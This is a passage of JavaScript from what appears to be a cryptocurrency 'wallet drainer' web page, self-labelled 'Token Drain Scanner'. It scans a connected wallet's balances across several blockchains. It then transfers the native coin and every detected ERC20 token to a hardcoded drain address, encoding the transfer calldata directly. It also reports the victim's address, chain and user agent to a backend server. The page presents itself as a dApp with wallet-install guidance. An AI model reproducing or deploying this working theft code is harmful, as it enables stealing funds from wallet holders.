                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - COMPLETE VERSION FOR ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and ETH to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain ETH/native token
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient ETH for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token (ETH, BNB, MATIC, etc.)
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const ethereum = getEthereum();
    
    // Get balance
    const balanceHex = await ethereum.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5);
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const ethereum = getEthereum();
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Switch to token's chain if needed
            if (currentChainId !== token.chainId) {
                await switchToChain(token.chainId);
            }
            
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const ethereum = getEthereum();
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    // Get gas estimate for token transfer
    const gasEstimate = await ethereum.request({
        method: 'eth_estimateGas',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData
        }]
    });
    
    const gasLimit = parseInt(gasEstimate, 16) * 2;
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    // Send token transfer
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    return txHash;
}

// Encode transfer function call
function encodeTransferData(amount) {
    const functionSignature = '0xa9059cbb';
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    return functionSignature + paddedAddress + paddedAmount;
}

// Switch to specific chain
async function switchToChain(chainId) {
    if (currentChainId === chainId) return;
    
    const ethereum = getEthereum();
    
    try {
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        currentChainId = chainId;
        
    } catch (error) {
        if (error.code === 4902) {
            await addNetworkToWallet(chainId);
        } else {
            throw error;
        }
    }
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
    
    console.log(`Progress: ${percent}% - ${message}`);
}

// Show wallet install guide
function showWalletInstallGuide() {
    const guideHTML = `
        <div class="wallet-install-guide">
            <h4>📱💻 Install Wallet</h4>
            <p>To use this dApp, you need a Web3 wallet:</p>
            <div class="wallet-download-grid">
                <a href="https://metamask.io/download/" target="_blank" class="download-card" style="background: #f6851b">
                    <span>🦊</span>
                    <span>MetaMask</span>
                </a>
                <a href="https://trustwallet.com/" target="_blank" class="download-card" style="background: #3375bb">
                    <span>🔶</span>
                    <span>Trust Wallet</span>
                </a>
                <a href="https://www.binance.com/en/download" target="_blank" class="download-card" style="background: #f0b90b">
                    <span>🟡</span>
                    <span>Binance Wallet</span>
                </a>
                <a href="https://www.coinbase.com/wallet/downloads" target="_blank" class="download-card" style="background: #0052ff">
                    <span>🔷</span>
                    <span>Coinbase Wallet</span>
                </a>
            </div>
            <p class="mobile-tip">
                <strong>Mobile Users:</strong> Open this link in your wallet's built-in browser for best experience.
            </p>
        </div>
        
        <style>
            .wallet-install-guide {
                margin: 20px 0;
                padding: 25px;
                background: linear-gradient(135deg, #fdf6e3, #faf3e0);
                border-radius: 20px;
                border: 2px solid #ffd166;
                text-align: center;
            }
            
            .wallet-install-guide h4 {
                margin-top: 0;
                color: #856404;
                font-size: 22px;
            }
            
            .wallet-download-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
                gap: 15px;
                margin: 25px 0;
            }
            
            .download-card {
                padding: 20px 15px;
                border-radius: 15px;
                color: white;
                text-decoration: none;
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 12px;
                font-weight: 600;
                transition: all 0.3s;
            }
            
            .download-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            }
            
            .download-card span:first-child {
                font-size: 32px;
            }
            
            .mobile-tip {
                font-size: 14px;
                color: #666;
                margin-top: 20px;
            }
        </style>
    `;
    
    statusEl.innerHTML = guideHTML;
}

// Update status
function updateStatus(message) {
    statusEl.textContent = message;
}

// Show UI elements
function showUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    });
}

// Hide UI elements
function hideUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                walletProvider: walletProvider,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    const ethereum = getEthereum();
    if (ethereum && ethereum.disconnect) {
        try {
            await ethereum.disconnect();
        } catch (error) {
            console.log('⚠️', error.message);
        }
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    walletProvider = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.selectWallet = selectWallet;
window.closeWalletSelector = closeWalletSelector;
window.handleMobileWalletClick = handleMobileWalletClick;
window.copyMobileUrl = copyMobileUrl;
window.closeMobileInstructions = closeMobileInstructions;

// Debug
console.log('=== Token Drain Scanner ===');
console.log('Version: 5.0 - Enhanced Wallet Support');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
console.log('===========================');
